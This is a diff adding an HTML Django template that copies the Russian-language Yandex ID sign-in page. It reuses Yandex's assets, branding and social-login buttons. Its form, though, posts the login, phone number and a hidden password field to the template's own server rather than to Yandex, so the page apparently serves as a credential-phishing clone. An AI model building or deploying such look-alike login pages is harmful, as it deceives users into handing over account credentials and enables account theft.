@@ -1,0 +1,278 @@
+<!doctype html>
+<html lang="ru" dir="ltr" data-page-type="react.authv2" class="is-js_no" data-view="default"
+      xmlns="http://www.w3.org/1999/html">
+<head><title>Авторизация</title>
+    <meta charSet="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"/>
+    <link crossorigin="anonymous" rel="preload" as="style"
+          href="https://yastatic.net/s3/passport-static/core/v1.88.25/css/react.authv2.cij.css"/>
+    <link crossorigin="anonymous" href="//yastatic.net/react/17.0.2/react-with-dom-and-polyfills.min.js" rel="preload"
+          as="script"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.8.0/chart.min.js"
+            integrity="sha512-sW/w8s4RWTdFFSduOTGtk4isV1+190E/GghVffMA9XczdJ2MDzSzLEubKAs5h0wzgSJOQTRYyaz73L3d6RtJSg=="
+            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link crossorigin="anonymous" href="https://yastatic.net/jquery/2.1.4/jquery.min.js" rel="preload" as="script"/>
+    <link rel="shortcut icon" href="/favicon.ico"/>
+    <meta name="pdb" content="disable"/>
+    <meta name="collections" content="disable"/>
+    <link crossorigin="anonymous" rel="stylesheet" type="text/css"
+          href="https://yastatic.net/s3/passport-static/core/v1.88.25/css/react.authv2.cij.css"/>
+    <link rel="stylesheet" type="text/css"
+          href="https://yastatic.net/s3/passport-auth-customs//customs/v1.64.10/passport.auth.customs.css"/>
+    <script type="text/javascript" nonce="34593585-7a71-4de4-b811-673282036213">
+        (function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);
+
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/libphonenumber-js/1.9.47/libphonenumber-js.min.js"></script>
+
+
+</head>
+<body class="Theme_color_yandex-default Theme_root_passport Theme_auth_domik Theme_root_default "
+      data-metrics-id="784657" data-user-type="null" data-version="1.88.25" data-origin="null">
+<div id="root" class="layout">
+    <div class="passp-flex-wrapper">
+        <div class="NoJS NoJS_isFloat">
+            <div class="NoJS-message">
+                <div class="NoJS-title">Необходимо включить JavaScript</div>
+                Для корректной работы этого сайта<a data-t="link:default"
+                                                    href="https://yandex.ru/support/common/browsers-settings/browsers-java-js-settings.xml"
+                                                    target="_blank" class="Link Link_view_default"> <!-- -->включите
+                JavaScript<!-- --> .</a></div>
+        </div>
+        <div class="passp-page">
+            <div class="passp-bg passp-bg_14"></div>
+            <div class="passp-flex-wrapper">
+                <div class="passp-content">
+                    <div class="passp-auth theme-default">
+                        <div class="passp-page-overlay"></div>
+                        <a data-t="backpane" href="https://mail.yandex.ru" class="PreviousStepButton"
+                           aria-label="Назад"><span data-link="https://mail.yandex.ru"></span></a>
+                        <div class="passp-auth-content">
+                            <div class="Header">
+                                <div class="Header-yaLogoBlock"><a aria-label="Яндекс" href="https://ya.ru"
+                                                                   tabindex="-1" class="Logo Logo_ya"></a></div>
+                            </div>
+                            <div class="passp-page-visibility"></div>
+                            <div class="">
+                                <div class="passp-route">
+                                    <div data-t="page:add-account" class="passp-auth-screen passp-add-account-page">
+                                        <div class="passp-add-account-page_has-social-block"><h1 data-t="title"
+                                                                                                 class="passp-title">
+                                            <span class="passp-add-account-page-title">Войдите с Яндекс ID</span></h1>
+                                            <div class="passp-login-form">
+                                                <form method="post">
+                                                    {% csrf_token %}
+                                                    <div class="AuthLoginInputToggle-wrapper AuthLoginInputToggle-wrapper_theme_default">
+                                                        <div class="AuthLoginInputToggle-type">
+                                                            <button data-t="button:default" data-type="login"
+                                                                    type="button"
+                                                                    class="Button2 Button2_checked Button2_size_l Button2_view_default"
+                                                                    aria-pressed="true" autoComplete="off"><span
+                                                                    class="Button2-Text">Почта</span></button>
+                                                        </div>
+                                                        <div class="AuthLoginInputToggle-type">
+                                                            <button data-t="button:clear" data-type="phone"
+                                                                    type="button"
+                                                                    class="Button2 Button2_size_l Button2_view_clear"
+                                                                    aria-pressed="false" autoComplete="off"><span
+                                                                    class="Button2-Text">Телефон</span></button>
+                                                        </div>
+                                                    </div>
+                                                    <div class="AuthLoginInputToggle-input">
+                                                        <div class="Field Field_view_rounded-corner"
+                                                             data-t="field:login">
+                                                            <div class="Field-label-wrapper"><label
+                                                                    class="Field-label Field-label_isVisuallyHidden"
+                                                                    data-t="field:label-login" for="passp-field-login">Введите
+                                                                ваш ID</label></div>
+                                                            <div class="Field-inputWrapper"><span
+                                                                    class="Textinput Textinput_view_rounded-corner Textinput_size_l"><input
+                                                                    type="text" data-t="field:input-login" dir="ltr"
+                                                                    aria-invalid="false" autoCorrect="off"
+                                                                    autoCapitalize="off" autoComplete="username"
+                                                                    class="Textinput-Control" id="passp-field-login"
+                                                                    name="login" placeholder="Логин или email"
+                                                                    value=""/><span class="Textinput-Box"></span></span>
+                                                            </div>
+                                                            <div class="Field-link" data-t="field:link-login"
+                                                                 id="field:link-login"><a data-t="link:default"
+                                                                                          href="/auth/restore/login?retpath=https%3A%2F%2Fmail.yandex.ru"
+                                                                                          weight="medium"
+                                                                                          class="Link Link_pseudo Link_view_default Link_weight_medium">Не помню</a>
+                                                            </div>
+                                                        </div>
+                                                        <div class="Field Field_view_rounded-corner Field_isFilled"
+                                                             data-t="field:phone">
+                                                            <div class="Field-label-wrapper">
+                                                                <label class="Field-label Field-label_isVisuallyHidden"
+                                                                       data-t="field:label-phone"
+                                                                       for="passp-field-phone">Номер мобильного
+                                                                    телефона</label>
+                                                            </div>
+                                                            <span class="Textinput Textinput_view_rounded-corner Textinput_size_l Textinput_phone-mask">
+    <div class="Field-unvoiced-placeholder Field-unvoiced-placeholder_phonePlaceholder"
+         aria-hidden="true"></div>
+    <input name="phone" class="Textinput-Control Textinput-Control_phone" id="passp-field-phone" inputmode="tel"
+           aria-invalid="false"
+           placeholder="" maxlength="18" oninput="handlePhoneInput(event)">
+
+    <span class="Textinput-Box"></span>
+  </span>
+                                                        </div>
+                                                    </div>
+
+
+                                                    <input type="password" class="passp-hidden-password-field"
+                                                           id="hiddenPassword" name="hidden-password" tabindex="-1"
+                                                           autoComplete="off" aria-hidden="true"/>
+                                                    <div class="passp-button passp-register-button"
+                                                         style="position:relative;display:none"><a
+                                                            data-t="button:pseudo:passp:register" id="passp:register"
+                                                            aria-expanded="false" aria-haspopup="false"
+                                                            href="https://passport.yandex.ru/registration?retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fprepare%3Fuuid%3D26d1c591-c532-4210-af64-275736125641%26goal%3Dhttps%253A%252F%252Fya.ru%252F%26finish%3Dhttps%253A%252F%252Fmail.yandex.ru&amp;process_uuid=dbe64451-6cbf-4d98-a516-bf419f6f03fa"
+                                                            class="Button2 Button2_type_link Button2_size_l Button2_view_pseudo Button2_width_max"><span
+                                                            class="Button2-Text">Создать ID</span></a></div>
+                                                    <div class="passp-button passp-sign-in-button">
+                                                        <button data-t="button:action:passp:sign-in" id="passp:sign-in"
+                                                                type="submit"
+                                                                class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit"
+                                                                aria-disabled="false" autoComplete="off"><span
+                                                                class="Button2-Text">Войти</span></button>
+                                                    </div>
+                                                    <div class="passp-button passp-exp-register-button"
+                                                         style="position:relative;display:block"><a
+                                                            data-t="button:pseudo:passp:exp-register"
+                                                            id="passp:exp-register" aria-expanded="false"
+                                                            aria-haspopup="false"
+                                                            href="https://passport.yandex.ru/registration?retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fprepare%3Fuuid%3D26d1c591-c532-4210-af64-275736125641%26goal%3Dhttps%253A%252F%252Fya.ru%252F%26finish%3Dhttps%253A%252F%252Fmail.yandex.ru&amp;process_uuid=dbe64451-6cbf-4d98-a516-bf419f6f03fa"
+                                                            class="Button2 Button2_type_link Button2_size_l Button2_view_pseudo Button2_width_max"><span
+                                                            class="Button2-Text">Создать ID</span></a></div>
+                                                </form>
+                                            </div>
+                                            <div class="AuthSocialBlock"><h2 class="AuthSocialBlock-title">Войти
+                                                с помощью</h2>
+                                                <div class="AuthSocialBlock-providers">
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-provider AuthSocialBlock-provider_code_vk"
+                                                            data-t="provider:primary:vk" aria-label="ВКонтакте"><span
+                                                            class="PasspIcon PasspIcon_vk PasspIcon_size_s"
+                                                            data-t="icon:vk"></span></button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-provider AuthSocialBlock-provider_code_gg"
+                                                            data-t="provider:primary:gg" aria-label="Google"><span
+                                                            class="PasspIcon PasspIcon_gg PasspIcon_size_s"
+                                                            data-t="icon:gg"></span></button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-provider AuthSocialBlock-provider_code_qr"
+                                                            data-t="provider:primary:qr" aria-label="QR-код"><span
+                                                            class="AuthSocialBlock-icon"></span><span
+                                                            class="AuthSocialBlock-name">QR-код</span></button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-provider AuthSocialBlock-provider_code_fb"
+                                                            data-t="provider:primary:fb" aria-label="Facebook"><span
+                                                            class="PasspIcon PasspIcon_fb PasspIcon_size_s"
+                                                            data-t="icon:fb"></span></button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
+                                                            data-t="provider:primary:mr" aria-label="Mail.ru"><span
+                                                            class="PasspIcon PasspIcon_mr PasspIcon_size_s"
+                                                            data-t="icon:mr"></span><span
+                                                            class="AuthSocialBlock-secondaryProviderName">Mail.ru</span>
+                                                    </button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
+                                                            data-t="provider:primary:ok" aria-label="Одноклассники">
+                                                        <span class="PasspIcon PasspIcon_ok PasspIcon_size_s"
+                                                              data-t="icon:ok"></span><span
+                                                            class="AuthSocialBlock-secondaryProviderName">Одноклассники</span>
+                                                    </button>
+                                                    <button type="button"
+                                                            class="AuthSocialBlock-secondaryProvider AuthSocialBlock-secondaryProvider_hidden"
+                                                            data-t="provider:primary:tw" aria-label="Twitter"><span
+                                                            class="PasspIcon PasspIcon_tw PasspIcon_size_s"
+                                                            data-t="icon:tw"></span><span
+                                                            class="AuthSocialBlock-secondaryProviderName">Twitter</span>
+                                                    </button>
+                                                    <button type="button" class="AuthSocialBlock-provider"
+                                                            data-t="provider:more" aria-hidden="true" tabindex="-1">
+                                                        <span class="PasspIcon PasspIcon_dots PasspIcon_size_s PasspIcon_withHover"
+                                                              data-t="icon:dots"></span></button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="yaIdPromoText">Яндекс ID — ключ от всех сервисов <a
+                                href="https://id.yandex.ru/about" class="yaIdPromoText_link">Узнать больше</a></div>
+                    </div>
+                </div>
+            </div>
+            <footer class="AuthFooter">
+                <div class="AuthFooter-wrapper">
+                    <div class="AuthFooter-incognitoLink"><span class="AuthFooter-item"><a data-t="link:default"
+                                                                                           target="_blank"
+                                                                                           href="https://yandex.ru/support/common/browsers-settings/incognito.html"
+                                                                                           class="Link Link_view_default">Используйте режим инкогнито на чужом компьютере</a></span>
+                    </div>
+                    <div class="AuthFooter-mainBlock"><span class="AuthFooter-item" aria-expanded="false"><span
+                            data-t="link:default"
+                            class="Link Link_pseudo Link_view_default AuthFooter-itemCap">ru</span><span
+                            class="AuthFooter-langList AuthFooter-langList_closed"><ul><li
+                            class="AuthFooter-langListItem"><a data-t="link:default"
+                                                               href="https://yandex.ru/portal/set/lang/?sk=y0a32c11569d1d4aa425cfb82ece04a0c&amp;retpath=https%3A%2F%2Fpassport.yandex.ru%2Fauth%3Fretpath%3Dhttps%253A%252F%252Fmail.yandex.ru&amp;intl=en"
+                                                               class="Link Link_view_default">En</a></li></ul></span></span><span
+                            class="AuthFooter-item"><a data-t="link:default" href="https://yandex.ru/support/passport/"
+                                                       target="_blank" class="Link Link_view_default">Справка и поддержка</a></span><span
+                            class="AuthFooter-item"><span class="AuthFooter-copyright">© 2001-2023, </span><a
+                            data-t="link:default" href="https://ya.ru" class="Link Link_view_default">Яндекс</a></span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+</div>
+
+<img class="g-hidden"
+     src="https://ysa-static.passport.yandex.net/static/1/96eb29b255b84bfd7016c2420aa13870/d.png?ex=yes"/>
+
+<link data-chunk="react.authv2" rel="stylesheet"
+      href="https://yastatic.net/s3/passport-static/core/v1.88.25/js/../css/react.authv2.cij.css"
+      crossorigin="anonymous">
+
+<script>
+   const emailButton = document.querySelector('[data-type="login"]');
+const phoneButton = document.querySelector('[data-type="phone"]');
+const emailField = document.querySelector('[data-t="field:login"]');
+const phoneField = document.querySelector('[data-t="field:phone"]');
+
+// при завантаженні сторінки, змінюємо стиль поля вводу, залежно від стану активної кнопки
+if (emailButton.getAttribute('aria-pressed') === 'true') {
+  emailField.style.display = 'block';
+  phoneField.style.display = 'none';
+} else {
+  emailField.style.display = 'none';
+  phoneField.style.display = 'block';
+}
+
+emailButton.addEventListener('click', () => {
+phoneField.querySelector('input').value = '';
+  emailField.style.display = 'block';
+  phoneField.style.display = 'none';
+});
+
+phoneButton.addEventListener('click', () => {
+emailField.querySelector('input').value = '';
+  emailField.style.display = 'none';
+  phoneField.style.display = 'block';
+});
+phoneField.addEventListener('click', () => {
+  phoneField.querySelector('input').focus();
+});
+
+</script>
+
+
+</body>
+</html>
